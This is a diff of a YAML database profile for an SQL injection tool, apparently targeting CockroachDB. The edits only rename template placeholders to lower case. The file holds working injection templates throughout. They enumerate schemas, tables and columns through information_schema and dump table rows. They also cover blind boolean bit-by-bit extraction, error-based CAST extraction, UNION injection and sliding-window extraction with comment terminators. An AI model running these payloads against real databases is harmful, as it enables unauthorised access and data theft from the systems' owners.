@@ -2,25 +2,25 @@ vendor:
 resource: 
  info: |
   concat_ws(
-      '${ENCLOSE_VALUE_SQL}',
+      '${enclose_value_sql}',
       version(),
       current_database(),
       '-'
   )
-  || '${TRAIL_SQL}'
+  || '${trail_sql}'
   
  schema: 
   database: |
    select 
        concat_agg(
-           '${ENCLOSE_VALUE_SQL}'
+           '${enclose_value_sql}'
            || r
-           || '${SEPARATOR_QTE_SQL}'
+           || '${separator_qte_sql}'
            || q::text
-           || '${ENCLOSE_VALUE_SQL}'
-           || '${SEPARATOR_CELL_SQL}'
+           || '${enclose_value_sql}'
+           || '${separator_cell_sql}'
        )
-       || '${TRAIL_SQL}'
+       || '${trail_sql}'
    from (
        SELECT
            tables.table_schema r,
@@ -28,74 +28,74 @@ resource:
        FROM information_schema.tables
        group by 1
        order by 1
-       {limit}
+       ${limit}
    ) x
    
   table: |
    select
        concat_agg(
-           '${ENCLOSE_VALUE_SQL}'
+           '${enclose_value_sql}'
            || r
-           || '${SEPARATOR_QTE_SQL}'
+           || '${separator_qte_sql}'
            || q::text
-           || '${ENCLOSE_VALUE_SQL}'
-           || '${SEPARATOR_CELL_SQL}'
+           || '${enclose_value_sql}'
+           || '${separator_cell_sql}'
        )
-       || '${TRAIL_SQL}'
+       || '${trail_sql}'
    from (
        SELECT 
            tables.table_name r,
            '0' q
        FROM information_schema.tables
-       where tables.TABLE_SCHEMA = '${DATABASE}'
+       where tables.TABLE_SCHEMA = '${database}'
        order by 1
-       {limit}
+       ${limit}
    ) x
    
   column: |
    select 
        concat_agg(
-           '${ENCLOSE_VALUE_SQL}'
+           '${enclose_value_sql}'
            || r
-           || '${SEPARATOR_QTE_SQL}'
+           || '${separator_qte_sql}'
            || q::text
-           || '${ENCLOSE_VALUE_SQL}'
-           || '${SEPARATOR_CELL_SQL}'
+           || '${enclose_value_sql}'
+           || '${separator_cell_sql}'
        )
-       || '${TRAIL_SQL}'
+       || '${trail_sql}'
    from (
        SELECT 
            columns.column_name r, 
            '0' q
        FROM information_schema.columns
-       where columns.TABLE_SCHEMA = '${DATABASE}'
-       and columns.TABLE_name = '${TABLE}'
+       where columns.TABLE_SCHEMA = '${database}'
+       and columns.TABLE_name = '${table}'
        order by 1
-       {limit}
+       ${limit}
    )x
    
   row: 
    query: |
     select 
         concat_agg(
-            '${ENCLOSE_VALUE_SQL}'
+            '${enclose_value_sql}'
             || r
-            || '${SEPARATOR_QTE_SQL}'
+            || '${separator_qte_sql}'
             || q::text
-            || '${ENCLOSE_VALUE_SQL}'
-            || '${SEPARATOR_CELL_SQL}'
+            || '${enclose_value_sql}'
+            || '${separator_cell_sql}'
         )
-        || '${TRAIL_SQL}'
+        || '${trail_sql}'
     from (
         SELECT 
-            substr((${FIELDS}), 1, 775) r,
+            substr((${fields}), 1, 775) r,
             count(*) q
-        FROM ${DATABASE}.${TABLE}
+        FROM ${database}.${table}
         group by 1
-        {limit}
+        ${limit}
     )x
    fields: 
-    field: trim(coalesce(${FIELD}::text, ''))
+    field: trim(coalesce(${field}::text, ''))
     concat: "|| '%7f' ||"
     
 strategy: 
@@ -103,19 +103,19 @@ strategy:
   slidingWindow: |
    select
        /**
-        * If reach end of string (${LEAD}i) then NULLIF nullifies the result
+        * If reach end of string (${lead}i) then NULLIF nullifies the result
         */
-       '${LEAD}'
+       '${lead}'
        || NULLIF(
            substr(
-               (${INJECTION}),
-               ${INDEX},
+               (${injection}),
+               ${index},
                65536
            ),
-           '${TRAIL_SQL}'
+           '${trail_sql}'
        )
-  limit: limit 65536 offset ${LIMIT}
-  failsafe: (1337${INDICE}7330%2b1)::text
+  limit: limit 65536 offset ${limit.value}
+  failsafe: (1337${indice}7330%2b1)::text
   calibrator: repeat('%23', 1024)
   limitBoundary: 0
   endingComment: --+-
@@ -124,8 +124,8 @@ strategy:
     - cockroachdb
     
  normal: 
-  indices: union select ${INDICES}
-  capacity: (select '${LEAD}${INDICE}' || ${CALIBRATOR})
+  indices: union select ${indices}
+  capacity: (select '${lead}${indice}' || ${calibrator})
   orderBy: order by 1337
   
  boolean: 
@@ -153,17 +153,17 @@ strategy:
     0 != (
         ascii(
             substr(
-                (${INJECTION}), 
-                ${INDEX}, 
+                (${injection}), 
+                ${index}, 
                 1
             )
         ) 
-        %26 ${BIT}
+        %26 ${bit}
     )
-   length: length((${INJECTION})) > ${INDEX}
+   length: length((${injection})) > ${index}
   modeAnd: and
   modeOr: or
-  blind: ${BOOLEAN.MODE} ${TEST}
+  blind: ${boolean.mode} ${test}
   
  error: 
   method: 
@@ -172,7 +172,7 @@ strategy:
       /* Require FALSE statement, then OR */
       and 1 = 0 
       or 1 = CAST(
-          (${WINDOW})::text 
+          (${window})::text 
           AS NUMERIC
       )
      capacity: 255
